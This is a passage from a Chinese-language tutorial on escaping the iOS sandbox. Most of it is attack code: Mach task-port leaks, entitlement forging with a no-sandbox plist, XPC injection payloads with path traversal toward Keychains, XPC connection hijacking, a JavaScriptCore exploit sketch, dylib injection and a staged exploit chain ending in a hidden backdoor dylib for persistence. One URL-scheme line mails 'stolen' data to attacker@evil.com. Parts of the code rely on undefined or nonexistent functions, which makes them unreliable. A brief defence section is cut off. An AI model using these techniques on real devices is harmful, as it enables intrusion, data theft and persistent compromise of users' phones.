    if (kr != KERN_SUCCESS) return kr;
    
    // 发送请求获取任务端口
    struct {
        mach_msg_header_t header;
        mach_msg_body_t body;
        mach_msg_port_descriptor_t task_port_desc;
    } request;
    
    request.header.msgh_bits = MACH_MSGH_BITS_SET(
        MACH_MSG_TYPE_COPY_SEND,
        MACH_MSG_TYPE_MAKE_SEND_ONCE,
        0, MACH_MSGH_BITS_COMPLEX);
    request.header.msgh_size = sizeof(request);
    request.header.msgh_remote_port = service_port;
    request.header.msgh_local_port = mig_get_reply_port();
    request.header.msgh_id = 0x2000;
    
    request.body.msgh_descriptor_count = 1;
    request.task_port_desc.name = MACH_PORT_NULL;
    request.task_port_desc.disposition = MACH_MSG_TYPE_PORT_RECEIVE;
    request.task_port_desc.type = MACH_MSG_PORT_DESCRIPTOR;
    
    kr = mach_msg(&request.header,
        MACH_SEND_MSG | MACH_RCV_MSG,
        sizeof(request), sizeof(request),
        mig_get_reply_port(),
        MACH_MSG_TIMEOUT_NONE,
        MACH_PORT_NULL);
    
    if (kr == KERN_SUCCESS) {
        mach_port_t leaked_port = request.task_port_desc.name;
        printf("[+] 获取到泄露的任务端口: %d\n", leaked_port);
    }
    
    return kr;
}
```

---

## 7. 网络沙箱绕过

### 7.1 网络访问控制分析

```c
// 网络沙箱分析
// iOS应用的网络访问限制

typedef struct {
    const char  *protocol;        // 协议类型
    bool        allowed;          // 是否允许
    const char  *restriction;     // 限制描述
} network_policy_t;

network_policy_t network_policies[] = {
    {"TCP出站",      true,  "默认允许，部分App受限"},
    {"UDP出站",      true,  "默认允许"},
    {"TCP入站",      false, "默认禁止"},
    {"UDP入站",      false, "默认禁止"},
    {"Raw Socket",   false, "默认禁止"},
    {"ICMP",         false, "默认禁止"},
    {"Unix Socket",  true,  "仅沙箱内"},
    {"Bluetooth",    false, "需要entitlement"},
    {"Multicast",    false, "默认禁止"},
};

// 网络沙箱绕过技术
// 通过DNS over HTTPS绕过网络监控
#include <curl/curl.h>

int bypass_network_monitoring(void) {
    CURL *curl = curl_easy_init();
    
    // 使用DoH绕过DNS监控
    curl_easy_setopt(curl, CURLOPT_DOH_URL, 
        "https://cloudflare-dns.com/dns-query");
    
    // 通过HTTPS隧道访问受限资源
    curl_easy_setopt(curl, CURLOPT_URL,
        "https://restricted-server.internal/api/data");
    
    // 使用代理链隐藏真实目标
    curl_easy_setopt(curl, CURLOPT_PROXY,
        "socks5://proxy-server:1080");
    
    CURLcode res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);
    
    return (res == CURLE_OK) ? 0 : -1;
}
```

### 7.2 本地网络探测

```c
// 本地网络探测技术
// 发现沙箱内可访问的网络服务

#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

// 扫描本地网络服务
int scan_local_services(void) {
    // 常见的本地服务端口
    uint16_t ports[] = {
        80, 443, 8080, 8443,   // HTTP/HTTPS
        62078,                  // Apple iPhone Sync (usbmuxd)
        49152, 49153, 49154,   // 动态端口
        5353,                   // mDNS
        53,                     // DNS
        631,                    // IPP打印
    };
    
    for (int i = 0; i < sizeof(ports)/sizeof(ports[0]); i++) {
        int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        
        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(ports[i]);
        addr.sin_addr.s_addr = inet_addr("127.0.0.1");
        
        // 设置超时
        struct timeval tv = {1, 0};
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
        
        int result = connect(sock, (struct sockaddr *)&addr, sizeof(addr));
        
        if (result == 0) {
            printf("[+] 端口 %d 开放\n", ports[i]);
            
            // 尝试banner抓取
            char banner[256];
            ssize_t n = recv(sock, banner, sizeof(banner)-1, 0);
            if (n > 0) {
                banner[n] = '\0';
                printf("    Banner: %s\n", banner);
            }
        }
        
        close(sock);
    }
    
    return 0;
}
```

---

## 8. 设备访问逃逸

### 8.1 IOKit设备访问

```c
// IOKit设备访问绕过
// 通过IOKit获取受限设备信息

#include <IOKit/IOKitLib.h>

// 枚举可用的IOKit服务
int enumerate_iokit_services(void) {
    io_iterator_t iterator;
    io_service_t service;
    
    // 匹配所有IOKit服务
    kern_return_t kr = IOServiceGetMatchingServices(
        kIOMainPortDefault,
        IOServiceMatching("IOService"),
        &iterator);
    
    if (kr != KERN_SUCCESS) return -1;
    
    int count = 0;
    while ((service = IOIteratorNext(iterator)) != IO_OBJECT_NULL) {
        io_name_t name;
        IOObjectGetClass(service, name);
        
        // 获取服务属性
        CFMutableDictionaryRef properties;
        IORegistryEntryCreateCFProperties(service, 
            &properties, kCFAllocatorDefault, 0);
        
        printf("[%d] %s\n", count++, name);
        
        CFRelease(properties);
        IOObjectRelease(service);
    }
    
    IOObjectRelease(iterator);
    return count;
}

// 尝试打开受限的UserClient
kern_return_t open_restricted_client(const char *class_name) {
    io_service_t service;
    io_connect_t connect;
    
    service = IOServiceGetMatchingService(
        kIOMainPortDefault,
        IOServiceMatching(class_name));
    
    if (service == IO_OBJECT_NULL) {
        return KERN_FAILURE;
    }
    
    // 尝试不同的连接类型
    for (uint32_t type = 0; type < 10; type++) {
        kern_return_t kr = IOServiceOpen(
            service, mach_task_self(), type, &connect);
        
        if (kr == KERN_SUCCESS) {
            printf("[+] 成功打开 %s (type=%d)\n", 
                   class_name, type);
            
            // 尝试调用方法
            uint64_t input = 0;
            uint64_t output[16];
            uint32_t output_count = 16;
            
            kr = IOConnectCallMethod(connect, 0,
                &input, 1, NULL, 0,
                output, &output_count, NULL, NULL);
            
            if (kr == KERN_SUCCESS) {
                printf("[+] 方法调用成功!\n");
            }
            
            IOServiceClose(connect);
            break;
        }
    }
    
    IOObjectRelease(service);
    return KERN_SUCCESS;
}
```

### 8.2 传感器数据访问

```objc
// 绕过沙箱访问传感器数据
// 通过私有API获取受限传感器信息

#import <Foundation/Foundation.h>
#import <CoreMotion/CoreMotion.h>
#import <dlfcn.h>

// 使用私有框架访问传感器
@interface SensorAccess : NSObject
@end

@implementation SensorAccess

// 通过CoreMotion获取运动数据
- (void)accessMotionData {
    CMMotionManager *manager = [[CMMotionManager alloc] init];
    
    if ([manager isDeviceMotionAvailable]) {
        [manager startDeviceMotionUpdatesToQueue:
            [NSOperationQueue mainQueue]
            withHandler:^(CMDeviceMotion *motion, NSError *error) {
                if (motion) {
                    // 获取精确的运动数据
                    CMRotationRate rotation = motion.rotationRate;
                    CMAcceleration gravity = motion.gravity;
                    CMAttitude *attitude = motion.attitude;
                    
                    NSLog(@"[+] 旋转: (%f, %f, %f)",
                          rotation.x, rotation.y, rotation.z);
                    NSLog(@"[+] 重力: (%f, %f, %f)",
                          gravity.x, gravity.y, gravity.z);
                }
            }];
    }
}

// 通过私有API获取电池信息
- (NSDictionary *)getBatteryInfo {
    // 加载私有框架
    void *handle = dlopen("/System/Library/PrivateFrameworks/"
                          "BatteryFoundation.framework/BatteryFoundation",
                          RTLD_LAZY);
    
    if (!handle) return nil;
    
    // 获取电池信息类
    Class bfBatteryClass = NSClassFromString(@"BFBattery");
    if (!bfBatteryClass) return nil;
    
    id battery = [bfBatteryClass performSelector:@selector(sharedBattery)];
    
    NSMutableDictionary *info = [NSMutableDictionary dictionary];
    
    // 获取各种电池属性
    NSArray *properties = @[
        @"currentCapacity",
        @"maxCapacity", 
        @"designCapacity",
        @"cycleCount",
        @"temperature",
        @"voltage",
        @"amperage",
        @"watts",
    ];
    
    for (NSString *prop in properties) {
        SEL sel = NSSelectorFromString(prop);
        if ([battery respondsToSelector:sel]) {
            id value = [battery performSelector:sel];
            info[prop] = value ?: @"N/A";
        }
    }
    
    dlclose(handle);
    return info;
}

@end
```

---

## 9. entitlements权限滥用

### 9.1 entitlements分析

```c
// iOS entitlements权限分析
// 通过entitlements获取额外权限

#include <Security/Security.h>

// 读取当前进程的entitlements
CFDictionaryRef read_entitlements(void) {
    SecTaskRef task = SecTaskCreateFromSelf(kCFAllocatorDefault);
    if (!task) return NULL;
    
    CFDictionaryRef ents = SecTaskCopyValueForEntitlement(
        task, CFSTR("com.apple.private.security.*"), NULL);
    
    CFRelease(task);
    return ents;
}

// 高价值entitlements列表
typedef struct {
    const char  *entitlement;     // entitlement名称
    const char  *description;     // 描述
    uint32_t    risk_level;       // 风险等级
    bool        sandbox_escape;   // 是否可逃逸沙箱
} entitlement_info_t;

entitlement_info_t valuable_entitlements[] = {
    {"com.apple.private.security.container-manager",
     "容器管理权限", 9, true},
    {"com.apple.private.tcc.manager",
     "TCC管理权限", 10, true},
    {"com.apple.backboardd.launchapplications",
     "启动应用权限", 7, true},
    {"com.apple.springboard.debugapplications",
     "调试应用权限", 10, true},
    {"get-task-allow",
     "调试允许", 10, true},
    {"com.apple.private.accounts.allaccounts",
     "所有账户访问", 8, true},
    {"com.apple.private.system-keychain",
     "系统钥匙串访问", 9, true},
    {"com.apple.security.exception.files.absolute-path.read-write",
     "文件路径异常", 7, true},
    {"com.apple.security.exception.mach-lookup.global-name",
     "Mach查找异常", 6, true},
    {"com.apple.security.exception.iokit-user-client-class",
     "IOKit客户端异常", 8, true},
};
```

### 9.2 entitlements伪造

```c
// entitlements伪造技术
// 在越狱环境中可能有效

#include <mach-o/loader.h>
#include <mach-o/fat.h>

// 修改Mach-O文件中的entitlements段
int forge_entitlements(const char *binary_path) {
    // 读取Mach-O文件
    int fd = open(binary_path, O_RDWR);
    if (fd < 0) return -1;
    
    struct stat st;
    fstat(fd, &st);
    
    void *mapped = mmap(NULL, st.st_size, 
                        PROT_READ | PROT_WRITE, 
                        MAP_SHARED, fd, 0);
    
    struct mach_header_64 *header = (struct mach_header_64 *)mapped;
    
    if (header->magic != MH_MAGIC_64) {
        munmap(mapped, st.st_size);
        close(fd);
        return -1;
    }
    
    // 查找LC_CODE_SIGNATURE加载命令
    struct load_command *cmd = (struct load_command *)(header + 1);
    for (uint32_t i = 0; i < header->ncmds; i++) {
        if (cmd->cmd == LC_CODE_SIGNATURE) {
            struct linkedit_data_command *sig = 
                (struct linkedit_data_command *)cmd;
            
            // 定位entitlements数据
            uint8_t *sig_data = (uint8_t *)mapped + sig->dataoff;
            
            // 解析CMS签名中的entitlements
            // 修改entitlements plist
            // 注意: 需要重新签名才能生效
            
            printf("[+] 找到代码签名段: offset=0x%x size=0x%x\n",
                   sig->dataoff, sig->datasize);
            break;
        }
        cmd = (struct load_command *)((uint8_t *)cmd + cmd->cmdsize);
    }
    
    munmap(mapped, st.st_size);
    close(fd);
    return 0;
}

// 构造新的entitlements plist
const char *construct_entitlements(void) {
    return 
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
        "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" "
        "\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n"
        "<plist version=\"1.0\">\n"
        "<dict>\n"
        "  <key>platform-application</key>\n"
        "  <true/>\n"
        "  <key>com.apple.private.security.container-required</key>\n"
        "  <false/>\n"
        "  <key>com.apple.private.security.no-sandbox</key>\n"
        "  <true/>\n"
        "  <key>get-task-allow</key>\n"
        "  <true/>\n"
        "  <key>com.apple.private.tcc.manager</key>\n"
        "  <true/>\n"
        "</dict>\n"
        "</plist>\n";
}
```

---

## 10. XPC服务逃逸技术

### 10.1 XPC服务枚举与攻击

```objc
// XPC服务深度分析与攻击
// 通过逆向XPC服务发现可利用接口

#import <Foundation/Foundation.h>
#import <objc/runtime.h>

// XPC服务接口枚举器
@interface XPCServiceEnumerator : NSObject
@end

@implementation XPCServiceEnumerator

// 枚举系统中所有XPC服务
- (NSArray *)enumerateSystemServices {
    NSMutableArray *services = [NSMutableArray array];
    
    // 搜索LaunchDaemons和LaunchAgents
    NSArray *plistPaths = @[
        @"/System/Library/LaunchDaemons",
        @"/System/Library/LaunchAgents",
        @"/Library/LaunchDaemons",
        @"/Library/LaunchAgents",
    ];
    
    NSFileManager *fm = [NSFileManager defaultManager];
    
    for (NSString *path in plistPaths) {
        NSArray *contents = [fm contentsOfDirectoryAtPath:path error:nil];
        
        for (NSString *file in contents) {
            if (![file hasSuffix:@".plist"]) continue;
            
            NSString *fullPath = [path stringByAppendingPathComponent:file];
            NSDictionary *plist = [NSDictionary dictionaryWithContentsOfFile:fullPath];
            
            NSString *serviceName = plist[@"Label"];
            NSDictionary *xpcConfig = plist[@"XPCService"];
            
            if (serviceName && xpcConfig) {
                [services addObject:@{
                    @"name": serviceName,
                    @"path": fullPath,
                    @"config": xpcConfig,
                    @"runAs": plist[@"UserName"] ?: @"mobile",
                }];
            }
        }
    }
    
    return services;
}

// 分析XPC服务的消息处理
- (void)analyzeServiceProtocol:(NSString *)serviceName {
    NSXPCConnection *conn = [[NSXPCConnection alloc]
        initWithServiceName:serviceName];
    
    // 尝试发现服务接受的消息类型
    // 通过发送不同类型的消息观察响应
    
    NSArray *testMessages = @[
        @{@"type": @"status"},
        @{@"type": @"info"},
        @{@"type": @"list"},
        @{@"type": @"get", @"key": @"*"},
        @{@"type": @"help"},
        @{@"type": @"debug"},
        @{@"type": @"version"},
    ];
    
    [conn resume];
    
    for (NSDictionary *msg in testMessages) {
        xpc_connection_t xpc_conn = 
            [conn valueForKey:@"_xpcConnection"];
        
        xpc_object_t xpc_msg = xpc_dictionary_create(NULL, NULL, 0);
        
        for (NSString *key in msg) {
            xpc_dictionary_set_string(xpc_msg, 
                key.UTF8String, 
                [msg[key] UTF8String]);
        }
        
        xpc_object_t reply = xpc_connection_send_message_with_reply_sync(
            xpc_conn, xpc_msg);
        
        if (xpc_get_type(reply) != XPC_TYPE_ERROR) {
            NSLog(@"[+] 服务响应: %@ -> %@", 
                  msg, [[NSString alloc] initWithData:
                      [NSPropertyListSerialization dataWithPropertyList:
                          [self objectFromXPC:reply]
                          format:NSPropertyListBinaryFormat_v1_0 
                          options:0 error:nil]
                      encoding:NSUTF8StringEncoding]);
        }
        
        xpc_release(reply);
        xpc_release(xpc_msg);
    }
}

@end
```

### 10.2 XPC消息注入

```c
// XPC消息注入技术
// 通过精心构造的XPC消息触发漏洞

#include <xpc/xpc.h>

// 构造特殊的XPC消息
xpc_object_t create_exploit_message(void) {
    xpc_object_t msg = xpc_dictionary_create(NULL, NULL, 0);
    
    // 设置命令
    xpc_dictionary_set_string(msg, "command", "process");
    
    // 注入特殊参数
    // 尝试触发整数溢出
    xpc_dictionary_set_uint64(msg, "size", 0xFFFFFFFFFFFFFFFF);
    
    // 尝试路径遍历
    xpc_dictionary_set_string(msg, "path", 
        "/private/var/mobile/../../root/Library/Keychains/");
    
    // 尝试注入特殊字符
    xpc_dictionary_set_string(msg, "name",
        "../../etc/passwd\x00hidden");
    
    // 尝试数组越界
    xpc_object_t array = xpc_array_create(NULL, 0);
    for (int i = 0; i < 10000; i++) {
        xpc_array_append_value(array, 
            xpc_uint64_create(0xDEADBEEF));
    }
    xpc_dictionary_set_value(msg, "data", array);
    xpc_release(array);
    
    // 尝试嵌套深度攻击
    xpc_object_t nested = msg;
    for (int i = 0; i < 100; i++) {
        xpc_object_t inner = xpc_dictionary_create(NULL, NULL, 0);
        xpc_dictionary_set_value(inner, "child", nested);
        nested = inner;
    }
    
    return nested;
}

// XPC连接劫持
int hijack_xpc_connection(const char *service_name) {
    // 注册同名服务来劫持连接
    xpc_connection_t conn = xpc_connection_create(
        service_name, NULL);
    
    xpc_connection_set_event_handler(conn, ^(xpc_object_t event) {
        if (xpc_get_type(event) == XPC_TYPE_CONNECTION) {
            // 新的客户端连接
            printf("[+] 客户端连接到劫持的服务\n");
            
            xpc_connection_set_event_handler(event, ^(xpc_object_t msg) {
                // 接收并分析客户端消息
                if (xpc_get_type(msg) == XPC_TYPE_DICTIONARY) {
                    const char *cmd = xpc_dictionary_get_string(msg, "command");
                    printf("[+] 收到命令: %s\n", cmd);
                    
                    // 返回伪造的响应
                    xpc_object_t reply = xpc_dictionary_create_reply(msg);
                    xpc_dictionary_set_string(reply, "result", "fake_data");
                    xpc_connection_send_message(event, reply);
                    xpc_release(reply);
                }
            });
            
            xpc_connection_resume(event);
        }
    });
    
    xpc_connection_resume(conn);
    return 0;
}
```

---

## 11. 浏览器沙箱逃逸

### 11.1 WebKit沙箱分析

```c
// WebKit浏览器沙箱分析
// Safari和WebKit使用的特殊沙箱配置

// WebKit沙箱策略 (简化)
/*
(version 1)
(deny default)

;; WebKit特有允许
(allow process-exec
    (literal "/System/Library/Frameworks/WebKit.framework/")
    (literal "/usr/libexec/webkit/*"))

;; 网络访问
(allow network-outbound
    (remote-ip "*"))

;; 文件访问 - 非常受限
(allow file-read*
    (subpath "/System/Library/Caches")
    (subpath "/System/Library/WebKit")
    (literal "/usr/share/zoneinfo"))

(allow file-write*
    (subpath "/private/var/mobile/Containers/Data/Application"))

;; 禁止直接IOKit访问
(deny iokit-open)

;; 限制Mach端口
(allow mach-lookup
    (global-name "com.apple.nsurlsessiond")
    (global-name "com.apple.webkit.network"))
*/

// WebKit渲染进程沙箱逃逸概念
// 利用JavaScript引擎漏洞突破浏览器沙箱

// JavaScript层面的利用
/*
function webkit_sandbox_escape() {
    // 步骤1: 利用JIT编译器漏洞
    // 获取任意内存读写能力
    
    // 步骤2: 泄露WebKit进程中的关键地址
    // - WebCore库基地址
    // - 堆分配地址
    // - 栈地址
    
    // 步骤3: 构造ROP链
    // 调用WebKit内部函数绕过沙箱检查
    
    // 步骤4: 通过WebKit的IPC机制
    // 向主进程发送特权请求
}
*/
```

### 11.2 JavaScriptCore利用

```javascript
// JavaScriptCore漏洞利用概念
// 通过JSC漏洞实现沙箱逃逸

// 类型混淆漏洞利用
function jit_type_confusion() {
    // 创建触发JIT优化的函数
    function optimize(a, b) {
        let result = a + b;
        if (typeof result === 'number') {
            return result | 0; // 强制整数
        }
        return result;
    }
    
    // JIT编译
    for (let i = 0; i < 10000; i++) {
        optimize(1, 2);
    }
    
    // 触发类型混淆
    let confused = optimize(1.1, 2.2);
    // confused被当作整数处理，但实际是double
    
    // 构造伪造的JS对象
    let fake_array = new Float64Array(1);
    let view = new DataView(fake_array.buffer);
    
    // 设置伪造的数组长度
    view.setBigUint64(0, BigInt('0xFFFFFFFF'), true);
    
    // 现在可以通过fake_array实现越界读写
    return {
        read: function(addr) {
            // 修改数组的backing store指针
            // 实现任意地址读取
            fake_array.setBackingStore(addr);
            return fake_array[0];
        },
        write: function(addr, value) {
            fake_array.setBackingStore(addr);
            fake_array[0] = value;
        }
    };
}

// 通过JSC原语实现沙箱逃逸
function escape_sandbox(primitives) {
    // 步骤1: 泄露进程关键地址
    let jsc_base = primitives.read(JSC_GLOBAL_OFFSET);
    let webkit_base = primitives.read(WEBKIT_GOT_OFFSET);
    
    // 步骤2: 找到沙箱检查函数
    let sandbox_check = webkit_base + SANDBOX_CHECK_OFFSET;
    
    // 步骤3: 修改沙箱检查函数
    // 将其替换为直接返回allow
    primitives.write(sandbox_check, RET_INSTRUCTION);
    
    // 步骤4: 现在可以执行受限操作
    // 如文件系统访问、网络请求等
    
    return true;
}
```

---

## 12. App沙箱逃逸实战

### 12.1 应用间通信逃逸

```objc
// 通过应用间通信机制实现沙箱逃逸
// 利用URL Scheme、Custom Keyboard等

#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>

// URL Scheme逃逸
@interface URLSchemeEscape : NSObject
@end

@implementation URLSchemeEscape

// 通过URL Scheme触发高权限应用执行操作
- (BOOL)escapeViaURLScheme:(NSString *)targetApp {
    // 构造特殊URL触发目标应用的隐藏功能
    NSDictionary *exploitURLs = @{
        @"prefs": @"prefs:root=General&path=Reset",
        @"tel": @"tel://1234567890",
        @"sms": @"sms:&body=malicious_content",
        @"mailto": @"mailto:attacker@evil.com?subject=data&body=stolen",
        @"itms-apps": @"itms-apps://itunes.apple.com/app/id123",
    };
    
    NSString *url = exploitURLs[targetApp];
    if (url) {
        return [[UIApplication sharedApplication] 
            openURL:[NSURL URLWithString:url]];
    }
    
    return NO;
}

// 通过Document Picker访问受限文件
- (void)escapeViaDocumentPicker {
    UIDocumentPickerViewController *picker = 
        [[UIDocumentPickerViewController alloc]
            initWithDocumentTypes:@[@"public.data"]
            inMode:UIDocumentPickerModeImport];
    
    // 用户可能选择敏感文件
    // 虽然需要用户交互，但可以结合社会工程学
    
    picker.delegate = self;
    // present picker...
}

// 通过Share Extension获取其他应用数据
- (void)escapeViaShareExtension:(NSExtensionContext *)context {
    for (NSExtensionItem *item in context.inputItems) {
        for (NSItemProvider *provider in item.attachments) {
            if ([provider hasItemConformingToTypeIdentifier:@"public.data"]) {
                [provider loadItemForTypeIdentifier:@"public.data"
                    options:nil 
                    completionHandler:^(id item, NSError *error) {
                        // 获取其他应用分享的数据
                        if ([item isKindOfClass:[NSURL class]]) {
                            NSURL *url = (NSURL *)item;
                            // 可能获取到其他应用的文件URL
                            NSData *data = [NSData dataWithContentsOfURL:url];
                            NSLog(@"[+] 获取数据: %lu bytes", data.length);
                        }
                    }];
            }
        }
    }
}

@end
```

### 12.2 动态库注入逃逸

```c
// 动态库注入技术
// 在越狱环境中实现沙箱逃逸

#include <dlfcn.h>
#include <mach/mach.h>
#include <mach-o/dyld.h>

// 通过DYLD_INSERT_LIBRARIES注入
int inject_via_dyld(const char *target_binary, 
                    const char *dylib_path)
{
    // 设置环境变量
    setenv("DYLD_INSERT_LIBRARIES", dylib_path, 1);
    setenv("DYLD_FORCE_FLAT_NAMESPACE", "1", 1);
    
    // 执行目标程序
    pid_t pid = fork();
    if (pid == 0) {
        execl(target_binary, target_binary, NULL);
        _exit(1);
    }
    
    int status;
    waitpid(pid, &status, 0);
    
    unsetenv("DYLD_INSERT_LIBRARIES");
    unsetenv("DYLD_FORCE_FLAT_NAMESPACE");
    
    return WEXITSTATUS(status);
}

// 通过task port注入动态库
kern_return_t inject_dylib_via_task_port(
    mach_port_t task_port,
    const char *dylib_path)
{
    // 在目标进程中分配内存
    vm_address_t remote_stack;
    vm_size_t stack_size = 0x10000;
    
    kern_return_t kr = vm_allocate(task_port,
        &remote_stack, stack_size,
        VM_FLAGS_ANYWHERE);
    
    if (kr != KERN_SUCCESS) return kr;
    
    // 构造dlopen调用的参数
    size_t path_len = strlen(dylib_path) + 1;
    vm_address_t remote_path;
    
    kr = vm_allocate(task_port, &remote_path, 
                     path_len, VM_FLAGS_ANYWHERE);
    
    kr = vm_write(task_port, remote_path,
                  (vm_offset_t)dylib_path, path_len);
    
    // 查找dlopen地址
    // 需要从本地进程计算偏移
    void *dlopen_addr = dlsym(RTLD_DEFAULT, "dlopen");
    
    // 创建远程线程执行dlopen
    arm_thread_state64_t state;
    memset(&state, 0, sizeof(state));
    state.__pc = (uint64_t)dlopen_addr;
    state.__x[0] = remote_path;     // path
    state.__x[1] = RTLD_NOW;        // mode
    state.__sp = remote_stack + stack_size - 0x100;
    state.__lr = 0;                 // 返回地址 (触发异常)
    
    thread_act_t thread;
    kr = thread_create_running(task_port,
        ARM_THREAD_STATE64,
        (thread_state_t)&state,
        ARM_THREAD_STATE64_COUNT,
        &thread);
    
    return kr;
}

// 函数替换 (Method Swizzling) 逃逸
#import <objc/runtime.h>

void swizzle_sandbox_check(void) {
    // 获取沙箱检查类
    Class sandboxClass = objc_getClass("SandboxHelper");
    if (!sandboxClass) return;
    
    // 替换沙箱检查方法
    Method original = class_getInstanceMethod(sandboxClass, 
        @selector(checkAccess:));
    
    if (original) {
        // 定义替代实现 - 始终返回允许
        IMP always_allow = imp_implementationWithBlock(
            ^BOOL(id self, NSString *resource) {
                NSLog(@"[+] 沙箱检查被绕过: %@", resource);
                return YES;
            });
        
        method_setImplementation(original, always_allow);
    }
}
```

---

## 13. 沙箱逃逸利用链

### 13.1 完整利用链设计

```
沙箱逃逸利用链:

阶段1: 信息收集
├── 枚举系统服务和端口
├── 分析沙箱策略
├── 识别可利用的接口
└── 确定攻击向量

阶段2: 初始突破
├── 触发目标漏洞
├── 获取初始代码执行
├── 建立通信通道
└── 验证突破成功

阶段3: 权限提升
├── 获取高权限端口
├── 利用entitlements漏洞
├── 修改沙箱策略
└── 禁用安全检查

阶段4: 持久化
├── 建立持久通信
├── 隐藏攻击痕迹
├── 设置后门机制
└── 确保重启后存活
```

```c
// 完整沙箱逃逸利用链实现
typedef struct {
    // 阶段1: 信息收集
    bool        service_enumerated;
    bool        sandbox_analyzed;
    
    // 阶段2: 初始突破
    bool        initial_breakthrough;
    mach_port_t compromised_port;
    
    // 阶段3: 权限提升
    bool        privilege_escalated;
    mach_port_t task_port;
    
    // 阶段4: 持久化
    bool        persistence_established;
    const char  *backdoor_path;
} exploit_chain_t;

// 阶段1: 信息收集
int phase1_reconnaissance(exploit_chain_t *chain) {
    printf("[*] 阶段1: 信息收集\n");
    
    // 枚举XPC服务
    enumerate_xpc_services();
    
    // 分析当前沙箱策略
    analyze_sandbox_profile();
    
    // 枚举Mach端口
    enumerate_mach_ports();
    
    // 识别高价值目标
    identify_targets();
    
    chain->service_enumerated = true;
    chain->sandbox_analyzed = true;
    
    printf("[+] 阶段1完成\n");
    return 0;
}

// 阶段2: 初始突破
int phase2_initial_breakthrough(exploit_chain_t *chain) {
    printf("[*] 阶段2: 初始突破\n");
    
    // 连接到目标服务
    mach_port_t target_port;
    kern_return_t kr = connect_to_target_service(&target_port);
    
    if (kr != KERN_SUCCESS) {
        printf("[-] 无法连接到目标服务\n");
        return -1;
    }
    
    // 触发漏洞
    kr = trigger_vulnerability(target_port);
    
    if (kr == KERN_SUCCESS) {
        chain->initial_breakthrough = true;
        chain->compromised_port = target_port;
        printf("[+] 阶段2完成 - 初始突破成功\n");
    }
    
    return kr == KERN_SUCCESS ? 0 : -1;
}

// 阶段3: 权限提升
int phase3_privilege_escalation(exploit_chain_t *chain) {
    printf("[*] 阶段3: 权限提升\n");
    
    if (!chain->initial_breakthrough) {
        printf("[-] 需要先完成初始突破\n");
        return -1;
    }
    
    // 通过泄露的端口获取任务端口
    mach_port_t task_port;
    kern_return_t kr = acquire_task_port_via_leak(
        chain->compromised_port, &task_port);
    
    if (kr == KERN_SUCCESS) {
        chain->privilege_escalated = true;
        chain->task_port = task_port;
        printf("[+] 阶段3完成 - 权限提升成功\n");
    }
    
    return kr == KERN_SUCCESS ? 0 : -1;
}

// 阶段4: 持久化
int phase4_persistence(exploit_chain_t *chain) {
    printf("[*] 阶段4: 持久化\n");
    
    if (!chain->privilege_escalated) {
        printf("[-] 需要先完成权限提升\n");
        return -1;
    }
    
    // 通过任务端口注入持久化代码
    const char *dylib_path = "/var/mobile/.backdoor.dylib";
    
    kern_return_t kr = inject_dylib_via_task_port(
        chain->task_port, dylib_path);
    
    if (kr == KERN_SUCCESS) {
        chain->persistence_established = true;
        chain->backdoor_path = dylib_path;
        printf("[+] 阶段4完成 - 持久化建立\n");
    }
    
    return kr == KERN_SUCCESS ? 0 : -1;
}

// 执行完整利用链
int execute_exploit_chain(void) {
    exploit_chain_t chain = {0};
    
    printf("========================================\n");
    printf("  iOS沙箱逃逸利用链\n");
    printf("========================================\n");
    
    if (phase1_reconnaissance(&chain) != 0) return -1;
    if (phase2_initial_breakthrough(&chain) != 0) return -1;
    if (phase3_privilege_escalation(&chain) != 0) return -1;
    if (phase4_persistence(&chain) != 0) return -1;
    
    printf("========================================\n");
    printf("  利用链执行完成!\n");
    printf("========================================\n");
    
    return 0;
}
```

### 13.2 利用链稳定性优化

```c
// 利用链稳定性优化技术

// 1. 竞态条件重试机制
typedef struct {
    int     max_retries;        // 最大重试次数
    int     retry_delay_ms;     // 重试延迟
    int     success_threshold;  // 成功阈值
    int     current_attempt;    // 当前尝试
} retry_config_t;

int reliable_exploit(retry_config_t *config) {
    int successes = 0;
    
    for (int i = 0; i < config->max_retries; i++) {
        config->current_attempt = i + 1;
        
        int result = attempt_exploit();
        
        if (result == 0) {
            successes++;
            if (successes >= config->success_threshold) {
                printf("[+] 利用成功 (尝试 %d 次)\n", i + 1);
                return 0;
            }
        } else {
            // 清理状态后重试
            cleanup_exploit_state();
            
            // 等待后重试
            struct timespec ts = {
                .tv_sec = config->retry_delay_ms / 1000,
                .tv_nsec = (config->retry_delay_ms % 1000) * 1000000
            };
            nanosleep(&ts, NULL);
        }
    }
    
    printf("[-] 利用失败 (成功率: %d/%d)\n", 
           successes, config->max_retries);
    return -1;
}

// 2. 内存布局稳定化
int stabilize_memory_layout(void) {
    // 通过大量分配稳定堆布局
    void *stabilizer[1000];
    
    for (int i = 0; i < 1000; i++) {
        stabilizer[i] = malloc(0x100);
        memset(stabilizer[i], 0x41 + (i % 26), 0x100);
    }
    
    // 释放交替大小的块，创建可预测的布局
    for (int i = 0; i < 1000; i += 2) {
        free(stabilizer[i]);
    }
    
    // 现在堆布局更加可预测
    return 0;
}
```

---

## 14. 防御机制与检测

### 14.1 沙箱增强策略

```c
// 增强沙箱防御措施

// 1. 更严格的文件访问控制
int enhanced_file_sandbox(void) {
    // 使用更细粒度的路径匹配
    // 禁止符号链接跟随
    // 禁止路径规范化绕过
    
    // 添加路径规范化检查
    char resolved_path[PATH_MAX];
    if (realpath(input_path, resolved_path) == NULL) {
        return EACCES;
    }
    
    // 验证解析后的路径仍在允许范围内
    if (strncmp(resolved_path, allowed_prefix, 
                strlen(allowed_prefix)) != 0) {
        return EACCES;
    }
    
    // 检查路径中是否包含符号链接
    struct stat st;
    if (lstat(input_path, &st) == 0) {
        if (S_ISLNK(st.st_mode)) {
            return EACCES; // 拒绝符号链接
        }
    }
    
    return 0;
}

// 2. IPC通信监控
int monitor_ipc_communication(void) {
    // 监控异常的Mach端口操作
    // 记录所有XPC连接
    // 检测端口名称碰撞
    
    // 安装MAC策略钩子
    // 记录所有跨沙箱边界的IPC
    mac_policy_register_ipc_hooks(
        ipc_log_callback,    // 日志回调
